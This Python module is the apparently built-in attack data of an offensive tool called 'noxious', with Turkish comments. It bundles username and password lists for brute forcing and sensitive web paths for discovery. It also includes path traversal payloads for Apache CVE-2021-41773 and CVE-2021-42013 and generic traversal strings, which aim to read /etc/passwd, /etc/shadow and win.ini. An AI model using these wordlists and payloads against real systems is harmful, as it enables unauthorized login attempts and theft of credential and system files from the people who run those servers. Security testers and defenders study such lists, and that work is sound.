#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious saldırı verileri - gömülü kullanıcı adları, parolalar ve dizin listeleri

harici dosya gerektirmeden brute force ve dizin tarama için
yerleşik veri setleri sağlar.
"""

from typing import List


# ========================================
# yaygin kullanici adlari (top 50)
# ========================================
YAYGIN_KULLANICILAR: List[str] = [
    "root", "admin", "administrator", "user", "test",
    "guest", "info", "mysql", "postgres", "oracle",
    "ftp", "ftpuser", "www", "www-data", "web",
    "ubuntu", "debian", "centos", "pi", "raspberry",
    "git", "svn", "nagios", "tomcat", "apache",
    "nginx", "jenkins", "deploy", "backup", "operator",
    "service", "daemon", "bin", "sys", "mail",
    "nobody", "sshd", "vagrant", "ansible", "docker",
    "student", "demo", "support", "manager", "dev",
    "server", "public", "private", "temp", "default",
]


# ========================================
# yaygin parolalar (top 100)
# ========================================
YAYGIN_PAROLALAR: List[str] = [
    "123456", "password", "12345678", "qwerty", "abc123",
    "123456789", "111111", "1234567", "iloveyou", "adobe123",
    "123123", "admin", "1234567890", "letmein", "photoshop",
    "1234", "monkey", "shadow", "sunshine", "12345",
    "password1", "princess", "azerty", "trustno1", "000000",
    "root", "toor", "pass", "test", "guest",
    "master", "login", "passw0rd", "hello", "charlie",
    "donald", "password123", "admin123", "root123", "toor123",
    "654321", "!@#$%^&*", "aa123456", "access", "flower",
    "dragon", "mustang", "121212", "696969", "batman",
    "football", "baseball", "soccer", "michael", "thomas",
    "summer", "george", "harley", "jessica", "ginger",
    "abcdef", "jordan", "pepper", "daniel", "hunter",
    "buster", "soccer", "hockey", "ranger", "robert",
    "matthew", "jennifer", "starwars", "qwerty123", "welcome",
    "welcome1", "p@ssw0rd", "changeme", "secret", "love",
    "computer", "internet", "samsung", "1q2w3e4r", "qwe123",
    "zaq1xsw2", "1qaz2wsx", "apple", "google", "linux",
    "oracle", "mysql", "ftp", "ssh", "server",
    "database", "backup", "temp", "default", "system",
]


# ========================================
# yaygin web di̇zi̇nleri̇ (keşif için)
# ========================================
YAYGIN_DIZINLER: List[str] = [
    "/admin", "/administrator", "/login", "/wp-admin", "/wp-login.php",
    "/admin/login", "/user/login", "/panel", "/cpanel", "/dashboard",
    "/phpmyadmin", "/pma", "/dbadmin", "/myadmin", "/mysql",
    "/backup", "/backups", "/bak", "/old", "/temp",
    "/tmp", "/test", "/testing", "/dev", "/development",
    "/staging", "/config", "/conf", "/configuration", "/setup",
    "/install", "/installer", "/api", "/api/v1", "/api/v2",
    "/rest", "/graphql", "/swagger", "/docs", "/documentation",
    "/.git", "/.git/config", "/.env", "/.htaccess", "/.htpasswd",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/security.txt",
    "/server-status", "/server-info", "/.well-known", "/info.php",
    "/phpinfo.php", "/wp-config.php.bak", "/web.config", "/elmah.axd",
    "/console", "/debug", "/trace", "/actuator", "/actuator/health",
    "/manager", "/manager/html", "/jmx-console", "/admin-console",
    "/shell", "/cmd", "/command", "/exec", "/cgi-bin",
    "/uploads", "/upload", "/files", "/images", "/assets",
    "/static", "/media", "/data", "/logs", "/log",
    "/secret", "/private", "/internal", "/hidden", "/portal",
]


# ========================================
# path traversal payload'lari
# ========================================
PATH_TRAVERSAL_PAYLOADLARI: List[str] = [
    # apache 2.4.49 cve-2021-41773
    "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
    # apache 2.4.50 cve-2021-42013
    "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    # klasik path traversal
    "/../../../etc/passwd",
    "/..%2f..%2f..%2fetc/passwd",
    "/..%252f..%252f..%252fetc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # windows path traversal
    "/..\\..\\..\\windows\\win.ini",
    "/..%5c..%5c..%5cwindows%5cwin.ini",
    # null byte injection (eski php)
    "/../../../etc/passwd%00",
    "/../../../etc/passwd%00.html",
]


# ========================================
# http user-agent li̇stesi̇ (keşif için)
# ========================================
HTTP_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Noxious/3.0 Security Scanner",
]


def kullanici_listesi_yukle(dosya_yolu: str = None) -> List[str]:
    """
    kullanıcı adı listesi yükler — dosyadan veya gömülü listeden

    parametreler:
        dosya_yolu: özel kullanıcı listesi dosyası (none ise gömülü liste)

    döndürür:
        kullanıcı adı listesi
    """
    if dosya_yolu:
        return _dosyadan_liste_yukle(dosya_yolu)
    return YAYGIN_KULLANICILAR[:]


def parola_listesi_yukle(dosya_yolu: str = None) -> List[str]:
    """
    parola listesi yükler — dosyadan veya gömülü listeden

    parametreler:
        dosya_yolu: özel parola listesi dosyası (none ise gömülü liste)

    döndürür:
        parola listesi
    """
    if dosya_yolu:
        return _dosyadan_liste_yukle(dosya_yolu)
    return YAYGIN_PAROLALAR[:]


def _dosyadan_liste_yukle(dosya_yolu: str) -> List[str]:
    """dosyadan satır satır liste yükler"""
    try:
        with open(dosya_yolu, "r", encoding="utf-8", errors="ignore") as f:
            return [satir.strip() for satir in f if satir.strip()]
    except FileNotFoundError:
        raise FileNotFoundError(f"liste dosyası bulunamadı: {dosya_yolu}")
    except OSError as hata:
        raise OSError(f"liste dosyası okunamadı: {hata}")
